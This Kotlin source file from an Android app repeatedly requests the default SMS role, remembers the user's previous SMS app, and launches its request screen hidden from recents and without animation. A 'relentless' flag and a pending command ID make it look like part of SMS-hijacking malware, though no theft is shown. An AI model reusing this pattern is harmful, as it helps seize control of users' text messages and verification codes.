package com.example.myandroid

import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Telephony
import android.app.role.RoleManager

object DefaultSmsManager {
    var expectedMode: String = ""
    var isRelentlessActive: Boolean = false
    var pendingCmdId: Int = -1

    fun isDefaultSms(ctx: Context): Boolean {
        return Telephony.Sms.getDefaultSmsPackage(ctx) == ctx.packageName
    }

    fun getStoredPreviousLabel(ctx: Context): String? {
        val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        val pkg = prefs.getString("original_sms_package", null) ?: return null
        return try {
            val pm = ctx.packageManager
            pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString()
        } catch (e: Exception) { null }
    }

    fun requestDefault(ctx: Context) {
        if (isDefaultSms(ctx)) {
            isRelentlessActive = false
            expectedMode = ""
            return
        }

        try {
            val intent = Intent(ctx, SmsRoleActivity::class.java)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS or Intent.FLAG_ACTIVITY_NO_ANIMATION)
            ctx.startActivity(intent)
        } catch (e: Exception) {
            DebugLogger.log("SMS_MGR", "Failed to launch SmsRoleActivity: ${e.message}")
        }
    }
}
